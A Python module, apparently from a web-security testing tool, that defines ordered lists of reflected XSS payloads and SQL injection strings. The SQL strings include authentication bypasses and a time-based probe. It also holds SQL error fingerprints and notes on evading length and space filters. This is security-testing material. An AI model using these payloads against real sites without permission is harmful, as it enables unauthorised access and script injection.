"""Payload libraries for the built-in techniques.

The ordering matters: the rule-based strategist walks these roughly from the
"loud and obvious" to the "small and sneaky", which is exactly the shape that
produces the demo's `[ERROR] too long -> [RECTIFY] shorten` moment.
"""

from __future__ import annotations

from typing import List

from .models import Payload


# ---------------------------------------------------------------------------
# Reflected XSS
# ---------------------------------------------------------------------------
# Deliberately starts with long, classic vectors (likely to trip a maxlength
# guard) and degrades to very short ones.
XSS_PAYLOADS: List[Payload] = [
    Payload(
        value="<script>alert(document.domain)</script>",
        name="classic-script",
        technique="reflected-xss",
        context="html",
        note="Textbook vector; long and easily length-filtered.",
    ),
    Payload(
        value='<img src=x onerror="alert(document.domain)">',
        name="img-onerror-long",
        technique="reflected-xss",
        context="html",
        note="Fires without <script>; still long.",
    ),
    Payload(
        value='"><svg onload=alert(document.domain)>',
        name="svg-breakout",
        technique="reflected-xss",
        context="attr",
        note="Breaks out of an attribute first.",
    ),
    Payload(
        value="<img src=x onerror=alert(1)>",
        name="img-onerror",
        technique="reflected-xss",
        context="html",
        note="Shorter, no quotes.",
    ),
    Payload(
        value="<svg onload=alert(1)>",
        name="svg-onload",
        technique="reflected-xss",
        context="html",
        note="Short and reliable.",
    ),
    Payload(
        value="<svg/onload=alert(1)>",
        name="svg-onload-slash",
        technique="reflected-xss",
        context="html",
        note="Slash instead of space defeats naive space filters.",
    ),
    Payload(
        value="<b onclick=alert(1)>x",
        name="tiny-onclick",
        technique="reflected-xss",
        context="html",
        note="Very short; needs interaction but proves injection.",
    ),
]


# ---------------------------------------------------------------------------
# SQL injection (authentication bypass + error/union)
# ---------------------------------------------------------------------------
SQLI_PAYLOADS: List[Payload] = [
    Payload(
        value="' OR '1'='1",
        name="classic-or",
        technique="sqli-auth-bypass",
        context="sql",
        note="Classic tautology.",
    ),
    Payload(
        value="' OR '1'='1' -- ",
        name="or-comment",
        technique="sqli-auth-bypass",
        context="sql",
        note="Tautology + comment out the rest.",
    ),
    Payload(
        value="admin' -- ",
        name="admin-comment",
        technique="sqli-auth-bypass",
        context="sql",
        note="Log in as a known user, comment out the password check.",
    ),
    Payload(
        value="' OR 1=1 -- ",
        name="or-numeric",
        technique="sqli-auth-bypass",
        context="sql",
        note="Numeric tautology.",
    ),
    Payload(
        value="') OR ('1'='1",
        name="paren-or",
        technique="sqli-auth-bypass",
        context="sql",
        note="Handles a parenthesised query.",
    ),
    Payload(
        value="' OR SLEEP(2)-- ",
        name="time-based",
        technique="sqli-time-based",
        context="sql",
        note="Last resort: blind time-based probe.",
    ),
]


# Error fingerprints that suggest the input reached a SQL engine.
SQL_ERROR_FINGERPRINTS = [
    "sql syntax",
    "sqlite3.",
    "unrecognized token",
    "near \"",
    "psycopg2",
    "mysql",
    "ora-0",
    "odbc",
    "sqlstate",
    "unterminated quoted string",
]


def library_for(kind: str) -> List[Payload]:
    if "sqli" in kind:
        return list(SQLI_PAYLOADS)
    if "xss" in kind:
        return list(XSS_PAYLOADS)
    return []
